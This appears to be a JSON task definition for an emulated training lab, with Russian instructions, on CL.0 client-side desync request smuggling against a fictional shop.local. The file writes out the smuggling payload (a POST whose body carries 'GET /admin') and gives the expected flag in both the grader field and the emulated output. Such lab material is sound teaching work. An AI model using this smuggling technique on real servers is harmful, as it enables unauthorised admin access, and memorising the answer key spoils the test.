@@ -1,0 +1,21 @@
+{
+  "id": "web-client-side-desync",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{cl0_b0dy_smuggl3_d3sync}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: client-side desync (CL.0)\n\n`shop.local` держит keep-alive. Эндпоинт `/api/nothing` отвечает `200` и\nНЕ читает тело POST — остаток тела станет следующим запросом.\n\n1. Проверь keep-alive:\n\n   curl -sI https://shop.local/ -H 'Connection: keep-alive'\n\n2. Отправь POST, тело которого — контрабандный `GET /admin`. Сервер не\n   дочитает тело, и `GET /admin` выполнится по тому же соединению:\n\n   curl -s -X POST https://shop.local/api/nothing --data-binary 'GET /admin HTTP/1.1'\n\n3. Ответ админки содержит флаг. Запиши в `found.txt` и набери `check`.\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local)",
+      "cases": [
+        { "match": "api/nothing[\\s\\S]*admin|admin[\\s\\S]*api/nothing", "example": "-s -X POST https://shop.local/api/nothing --data-binary 'GET /admin HTTP/1.1'", "output": "HTTP/1.1 200 OK\nContent-Length: 0\n\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n<h1>Admin panel</h1>\nnto{cl0_b0dy_smuggl3_d3sync}\n" },
+        { "match": "keep-alive", "example": "-sI https://shop.local/ -H 'Connection: keep-alive'", "output": "HTTP/1.1 200 OK\nConnection: keep-alive\nContent-Length: 0\n" },
+        { "match": "api/nothing", "example": "-s -X POST https://shop.local/api/nothing --data-binary 'GET /x HTTP/1.1'", "output": "HTTP/1.1 200 OK\nContent-Length: 0\n\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только keep-alive и /api/nothing на shop.local.\n"
+    }
+  }
+}
